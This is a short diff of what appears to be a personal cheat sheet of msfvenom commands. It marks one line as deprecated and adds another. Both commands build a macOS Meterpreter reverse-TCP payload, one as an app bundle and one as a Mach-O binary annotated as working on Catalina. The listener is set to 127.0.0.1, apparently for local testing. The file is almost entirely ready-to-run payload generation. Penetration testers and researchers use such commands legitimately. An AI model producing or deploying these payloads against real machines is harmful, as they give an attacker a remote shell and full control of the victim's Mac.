@@ -1,3 +1,5 @@
-#Mac - Bin
+# Mac - Bin [deprecated]
 sudo msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=3220 -f osx-app -o /Users/jhon/Desktop/l.bin
 
+# Mac - Mach-o [works on Catalina]
+sudo ./msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=3320 -f macho -o ./x
